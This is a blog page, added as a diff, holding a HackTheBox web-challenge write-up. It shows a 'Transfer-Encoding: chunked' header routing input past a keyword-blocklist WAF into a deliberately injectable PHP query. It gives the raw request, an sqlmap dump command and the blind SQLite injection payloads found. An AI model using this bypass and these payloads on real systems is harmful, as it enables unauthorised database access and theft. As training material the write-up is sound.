@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html 
+  lang="en" 
+  dir="ltr">
+
+<head>
+  <link rel="icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+  
+  <meta name="description" content="|_337 |-|4&gt;&lt;0R?" />
+  
+  
+
+  <title>
+    
+    HackTheBox | 0xBOverchunked
+    
+</title>
+  <link rel="alternate" type="application/atom+xml" title="Machiavelli&#x27;s Homepage Atom Feed" href="https://machiavelli.me/atom.xml" />
+
+  
+  <link rel="stylesheet" href="https://machiavelli.me/site.css">
+  
+
+  
+  
+</head>
+
+<body class="hack dark main container">
+  
+    
+        
+  
+  <header class="nav-header">
+    <nav itemscope itemtype="http://schema.org/SiteNavigationElement" class="navbar">
+      <div class="nav-links">
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me">
+          <span itemprop="name">Home</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/rquotes">
+          <span itemprop="name">rquotes</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/lolbas">
+          <span itemprop="name">lolbas</span></a>
+        
+      </div>
+    </nav>
+    
+    <div class="search-container">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" class="search-icon">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
+      </svg>
+      <input type="text" id="search" placeholder="Search...">
+      <div class="search-results">
+        <div class="search-results__items"></div>
+      </div>
+    </div>
+    
+
+  </header>
+  
+  
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">HackTheBox | 0xBOverchunked</h1>
+        <span class="muted">
+    <svg class="icon i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>2 minute read</span>
+    <svg class="icon i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2024-02-27
+</span>
+    </header>
+        
+        <nav aria-label="Table of contents">
+        <details>
+            <summary role="button" style="padding: 0rem 0rem 0rem 0rem;margin: 1rem 0rem 1.5rem 0rem;">
+            Table of Contents
+            <br>
+            </summary>
+            <ul>
+            
+                <li>
+                <a href="https://machiavelli.me/htb-0xboverchunked/#category-web">CATEGORY: Web</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/htb-0xboverchunked/#difficulty-easy">Difficulty: Easy</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/htb-0xboverchunked/#challenge-description-are-you-able-to-retrieve-the-6th-character-from-the-database">Challenge Description: Are you able to retrieve the 6th character from the database?</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/htb-0xboverchunked/#app-structure">App Structure:</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/htb-0xboverchunked/#let-s-get-the-flag">Let’s Get the Flag</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/htb-0xboverchunked/#congratulations">Congratulations!</a>
+                
+                </li>
+            
+            </ul>
+        </details>
+        </nav>
+
+
+    <div itemprop="articleBody">
+      <p>HackTheBox 0xBOverchunked challenge write-up.
+Are you able to retrieve the 6th character from the database?</p>
+<span id="continue-reading"></span><h2 id="category-web">CATEGORY: Web</h2>
+<h2 id="difficulty-easy">Difficulty: Easy</h2>
+<h2 id="challenge-description-are-you-able-to-retrieve-the-6th-character-from-the-database">Challenge Description: Are you able to retrieve the 6th character from the database?</h2>
+<p>You can download the task source code from here → <a href="https://app.hackthebox.com/challenges/0xBOverchunked">Challenge</a></p>
+<h2 id="app-structure">App Structure:</h2>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#5ebfcc;">.
+</span><span style="color:#eb6772;">├──</span><span style="color:#abb2bf;"> 0xBOverchunked.zip
+</span><span style="color:#eb6772;">├──</span><span style="color:#abb2bf;"> build_docker.sh
+</span><span style="color:#eb6772;">├──</span><span style="color:#abb2bf;"> challenge
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   ├── assets
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   ├── images
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │   ├── bg.png
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │   ├── game-boy8bit.png
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │   └── posts
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │       ├── 1.png
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │       ├── 2.png
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │       ├── 3.png
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │       ├── 4.png
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │       └── 5.png
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   └── styles
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │       └── style.css
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   ├── Controllers
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   ├── Database
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │   ├── Connect.php
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │   └── Cursor.php
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   ├── Handlers
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   │   └── SearchHandler.php
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   └── WAF
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │       └── waf.php
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   ├── db
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   │   └── init.sql
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   └── index.php
+</span><span style="color:#eb6772;">├──</span><span style="color:#abb2bf;"> conf
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   ├── httpd.conf
+</span><span style="color:#eb6772;">│</span><span style="color:#abb2bf;">   └── supervisord.conf
+</span><span style="color:#eb6772;">└──</span><span style="color:#abb2bf;"> Dockerfile
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">12</span><span style="color:#abb2bf;"> directories, 19 files
+</span></code></pre>
+<p>After downloading the source code and unzipping it, let’s analyze it.</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-0xboverchunked&#x2F;assets/images/main-htb-0xboverchunked.webp" 
+      alt="Challenge Homepage" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>Searching by ID seems to be an interesting functionality.</p>
+<p>Play around with the search bar to understand how it works, then test it for vulnerabilities.</p>
+<p>While navigating through the files, if you look at <code>Cursor.php</code>, you’ll see two functions: <code>unsafequery</code> and <code>safequery</code>. The <code>unsafequery</code> function takes <code>$pdo</code> and <code>$id</code> as parameters and executes them inside an SQL query without a prepared statement. However, the <code>safequery</code> function takes the same parameters and executes them using a prepared statement.</p>
+<p><strong>Note:</strong> If you don’t know what a prepared statement is, you can read about it here → <a href="https://www.w3schools.com/php/php_mysql_prepared_statements.asp">Prepared Statements</a></p>
+<pre data-lang="php" style="background-color:#2b303b;color:#6c7079;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#abb2bf;">
+</span><span style="color:#c94e42;">&lt;?php
+</span><span style="color:#cd74e8;">require_once </span><span style="color:#9acc76;">&#39;Connect.php&#39;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">function </span><span style="color:#5cb3fa;">safequery</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">$pdo</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">$id</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">{
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">$id </span><span style="color:#adb7c9;">== </span><span style="color:#db9d63;">6</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">    {
+</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">die</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&quot;You are not allowed to view this post!&quot;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">$stmt </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">$pdo</span><span style="color:#abb2bf;">-&gt;</span><span style="color:#eb6772;">prepare</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&quot;</span><span style="color:#cd74e8;">SELECT</span><span style="color:#abb2bf;"> id, gamename, gamedesc, image </span><span style="color:#cd74e8;">FROM</span><span style="color:#abb2bf;"> posts  </span><span style="color:#cd74e8;">WHERE</span><span style="color:#abb2bf;"> id </span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;"> ?</span><span style="color:#9acc76;">&quot;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">$stmt</span><span style="color:#abb2bf;">-&gt;</span><span style="color:#eb6772;">execute</span><span style="color:#abb2bf;">([</span><span style="color:#eb6772;">$id</span><span style="color:#abb2bf;">]);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">$result </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">$stmt</span><span style="color:#abb2bf;">-&gt;</span><span style="color:#eb6772;">fetch</span><span style="color:#abb2bf;">(</span><span style="color:#f0c678;">PDO</span><span style="color:#abb2bf;">::</span><span style="color:#db9d63;">FETCH_ASSOC</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">return </span><span style="color:#eb6772;">$result</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">}
+</span><span style="color:#abb2bf;">
+</span><span style="color:#cd74e8;">function </span><span style="color:#5cb3fa;">unsafequery</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">$pdo</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">$id</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">{
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">try
+</span><span style="color:#abb2bf;">    {
+</span><span style="color:#abb2bf;">        </span><span style="color:#eb6772;">$stmt </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">$pdo</span><span style="color:#abb2bf;">-&gt;</span><span style="color:#eb6772;">query</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&quot;</span><span style="color:#cd74e8;">SELECT</span><span style="color:#abb2bf;"> id, gamename, gamedesc, image </span><span style="color:#cd74e8;">FROM</span><span style="color:#abb2bf;"> posts </span><span style="color:#cd74e8;">WHERE</span><span style="color:#abb2bf;"> id </span><span style="color:#adb7c9;">= </span><span style="color:#9acc76;">&#39;</span><span style="color:#eb6772;">$id</span><span style="color:#9acc76;">&#39;&quot;</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">        </span><span style="color:#eb6772;">$result </span><span style="color:#adb7c9;">= </span><span style="color:#eb6772;">$stmt</span><span style="color:#abb2bf;">-&gt;</span><span style="color:#eb6772;">fetch</span><span style="color:#abb2bf;">(</span><span style="color:#f0c678;">PDO</span><span style="color:#abb2bf;">::</span><span style="color:#db9d63;">FETCH_ASSOC</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">return </span><span style="color:#eb6772;">$result</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">catch</span><span style="color:#abb2bf;">(</span><span style="color:#f0c678;">Exception </span><span style="color:#eb6772;">$e</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">    {
+</span><span style="color:#abb2bf;">        </span><span style="color:#5ebfcc;">http_response_code</span><span style="color:#abb2bf;">(</span><span style="color:#db9d63;">500</span><span style="color:#abb2bf;">);
+</span><span style="color:#abb2bf;">        </span><span style="color:#5ebfcc;">echo </span><span style="color:#9acc76;">&quot;Internal Server Error&quot;</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">exit</span><span style="color:#abb2bf;">();
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">}
+</span><span style="color:#abb2bf;">
+</span><span style="color:#c94e42;">?&gt;
+</span></code></pre>
+<p>If you try to inject some SQL, you’ll get this message:</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-0xboverchunked&#x2F;assets/images/waf.webp" 
+      alt="WAF Message" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>It seems like a WAF is being used (actually, you already know this from the <code>waf.php</code> file :D).</p>
+<p>Let’s navigate through <code>waf.php</code>.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#6c7079;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#abb2bf;">
+</span><span style="color:#c94e42;">&lt;?php
+</span><span style="color:#cd74e8;">function </span><span style="color:#5cb3fa;">waf_sql_injection</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">$input</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">{
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">$sql_keywords </span><span style="color:#adb7c9;">= </span><span style="color:#5ebfcc;">array</span><span style="color:#abb2bf;">(
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;</span><span style="color:#cd74e8;">SELECT</span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;</span><span style="color:#cd74e8;">INSERT</span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;</span><span style="color:#cd74e8;">UPDATE</span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;</span><span style="color:#cd74e8;">DELETE</span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;UNION&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;DROP&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;TRUNCATE&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">ALTER</span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">CREATE</span><span style="color:#9acc76;">&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;FROM&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;WHERE&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;GROUP BY&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;HAVING&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;ORDER BY&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;LIMIT&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;OFFSET&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;JOIN&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;ON&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;SET&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;VALUES&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;INDEX&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;KEY&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;PRIMARY&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;FOREIGN&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;REFERENCES&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;TABLE&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;VIEW&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;AND&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;OR&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&quot;&#39;&quot;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;&quot;&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&quot;&#39;)&quot;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;-- -&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;#&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;--&#39;</span><span style="color:#abb2bf;">,
+</span><span style="color:#abb2bf;">        </span><span style="color:#9acc76;">&#39;-&#39;
+</span><span style="color:#abb2bf;">    );
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">foreach </span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">$sql_keywords </span><span style="color:#adb7c9;">as </span><span style="color:#eb6772;">$keyword</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">    {
+</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">(</span><span style="color:#5ebfcc;">stripos</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">$input</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">$keyword</span><span style="color:#abb2bf;">) </span><span style="color:#adb7c9;">!== </span><span style="color:#db9d63;">false</span><span style="color:#abb2bf;">)
+</span><span style="color:#abb2bf;">        {
+</span><span style="color:#abb2bf;">            </span><span style="color:#cd74e8;">return </span><span style="color:#db9d63;">false</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">        }
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">return </span><span style="color:#db9d63;">true</span><span style="color:#abb2bf;">;
+</span><span style="color:#abb2bf;">}
+</span><span style="color:#abb2bf;">
+</span><span style="color:#c94e42;">?&gt;
+</span></code></pre>
+<p>The <code>foreach</code> loop searches for SQL keywords in the search input and sanitizes it.</p>
+<p>It looks like a very restrictive WAF.</p>
+<p>But how can we bypass this WAF and reach the <code>unsafequery</code> function?</p>
+<p>While analyzing <code>SearchHandler.php</code>, we’ll see this <code>if</code> statement:</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#6c7079;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">if (isset($_SERVER[&quot;HTTP_TRANSFER_ENCODING&quot;]) &amp;&amp; $_SERVER[&quot;HTTP_TRANSFER_ENCODING&quot;] == &quot;chunked&quot;)
+</span><span style="color:#abb2bf;">{
+</span><span style="color:#abb2bf;">    $search = $_POST[&#39;search&#39;];
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    $result = unsafequery($pdo, $search);
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">    if ($result)
+</span><span style="color:#abb2bf;">    {
+</span><span style="color:#abb2bf;">        echo &quot;&lt;</span><span style="color:#eb6772;">div </span><span style="color:#db9d63;">class</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&#39;results&#39;</span><span style="color:#abb2bf;">&gt;No post id found.&lt;/</span><span style="color:#eb6772;">div</span><span style="color:#abb2bf;">&gt;&quot;;
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">    else
+</span><span style="color:#abb2bf;">    {
+</span><span style="color:#abb2bf;">        http_response_code(500);
+</span><span style="color:#abb2bf;">        echo &quot;Internal Server Error&quot;;
+</span><span style="color:#abb2bf;">        exit();
+</span><span style="color:#abb2bf;">    }
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">}
+</span></code></pre>
+<p>This statement checks for the <code>Transfer-Encoding</code> header with the value <code>chunked</code> (it has nothing to do with HTTP Request Smuggling).</p>
+<p>If we include the <code>Transfer-Encoding: chunked</code> header in our request, we’ll reach the <code>unsafequery</code> function and inject some SQL.</p>
+<h2 id="let-s-get-the-flag">Let’s Get the Flag</h2>
+<p>Request used:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">POST /Controllers/Handlers/SearchHandler.php HTTP/1.1
+</span><span style="color:#abb2bf;">Host: host
+</span><span style="color:#abb2bf;">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span style="color:#abb2bf;">Accept: */*
+</span><span style="color:#abb2bf;">Accept-Language: en-US,en;q=0.5
+</span><span style="color:#abb2bf;">Accept-Encoding: gzip, deflate, br
+</span><span style="color:#abb2bf;">Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+</span><span style="color:#abb2bf;">X-Requested-With: XMLHttpRequest
+</span><span style="color:#abb2bf;">Content-Length: 8
+</span><span style="color:#abb2bf;">Origin: http://host/
+</span><span style="color:#abb2bf;">Connection: close
+</span><span style="color:#abb2bf;">Referer: http://host/
+</span><span style="color:#abb2bf;">Transfer-Encoding: chunked
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">search=1
+</span></code></pre>
+<p>Then run <code>sqlmap</code> on that request:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">sqlmap -r</span><span style="color:#abb2bf;"> request</span><span style="color:#eb6772;"> --risk</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">3</span><span style="color:#eb6772;"> --level</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">5</span><span style="color:#eb6772;"> --dbms</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">sqlite</span><span style="color:#eb6772;"> --ignore-code</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">500</span><span style="color:#eb6772;"> --dump -T</span><span style="color:#abb2bf;"> posts</span><span style="color:#eb6772;"> --threads</span><span style="color:#abb2bf;"> 10
+</span></code></pre>
+<p><code>sqlmap</code> will detect a blind SQL injection:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">sqlmap</span><span style="color:#abb2bf;"> resumed the following injection point(s) </span><span style="color:#eb6772;">from</span><span style="color:#abb2bf;"> stored session:
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Parameter:</span><span style="color:#abb2bf;"> search (POST)
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Type:</span><span style="color:#abb2bf;"> boolean-based blind
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Title:</span><span style="color:#abb2bf;"> AND boolean-based blind - WHERE or HAVING clause
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">Payload:</span><span style="color:#abb2bf;"> search=1</span><span style="color:#9acc76;">&#39; AND 1602=1602-- tNrW
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">    Type: time-based blind
+</span><span style="color:#9acc76;">    Title: SQLite &gt; 2.0 AND time-based blind (heavy query)
+</span><span style="color:#9acc76;">    Payload: search=1&#39;</span><span style="color:#abb2bf;"> AND 9040=LIKE(CHAR(65,66,67,68,69,70,71)</span><span style="color:#eb6772;">,UPPER</span><span style="color:#abb2bf;">(HEX(RANDOMBLOB(500000000/2))))</span><span style="color:#eb6772;">--</span><span style="color:#abb2bf;"> xaaq
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">web</span><span style="color:#abb2bf;"> application technology: Apache
+</span><span style="color:#eb6772;">back-end</span><span style="color:#abb2bf;"> DBMS: SQLite
+</span></code></pre>
+<p>After a few minutes, you’ll get the flag.</p>
+<h2 id="congratulations">Congratulations!</h2>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Machiavelli
+                
+                
+                    
+                    in <a href="https://machiavelli.me/categories/ctf/">CTF</a>
+                
+                
+                    and
+                    tagged
+                    
+                        <a href="https://machiavelli.me/tags/ctf/">CTF</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/hackthebox/">HackTheBox</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/htb/">HTB</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/challenge/">Challenge</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/php/">PHP</a>
+                        
+                            
+                                
+                                    and
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/sql-injection/">SQL Injection</a>
+                        
+                            
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+
+  <!-- optional scripts -->
+  
+  
+  <script src="https://machiavelli.me/js/codeblock.js"></script>
+  
+
+  
+<!-- MathJax script for rendering LaTeX math equations -->
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"],
+      ],
+      displayMath: [
+        ["$$", "$$"],
+        ["\\[", "\\]"],
+      ],
+    },
+  };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>
+
+
+  
+<script type="text/javascript" src="https://machiavelli.me/elasticlunr.min.js"></script>
+<script type="text/javascript" src="https://machiavelli.me/js/search.js"></script>
+
+
+  
+</body>
+
+</html>
